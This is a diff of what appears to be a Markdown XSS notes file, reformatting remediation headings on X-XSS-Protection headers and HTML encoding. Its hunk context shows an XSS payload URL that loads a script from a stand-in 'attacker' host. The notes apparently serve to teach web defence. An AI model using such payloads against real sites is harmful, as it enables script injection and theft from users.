@@ -74,8 +74,8 @@ http://example/?var=<SRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
 
 ## ⛑️ Remediation     
-### - Server-Side validation
-   1. [x] ***X-XSS-Protection***
+### 1. Server-Side validation
+   1. [x] ***X-XSS-Protection*** Header
    ```
    X-XSS-Protection: 0                           -> xss filter disabled
    X-XSS-Protection: 1                           -> xss filter enabled and sanitized the page if attack detected
@@ -89,7 +89,7 @@ http://example/?var=<SRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
 
 ***Refrence:*** https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
 
-### - Client(Application)/Server side validation
+### 2. Client(Application)/Server side validation
 
    1. [x] HTML Encode Before Inserting Untrusted Data into HTML Element Content: `<body>...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE.</body>`
 
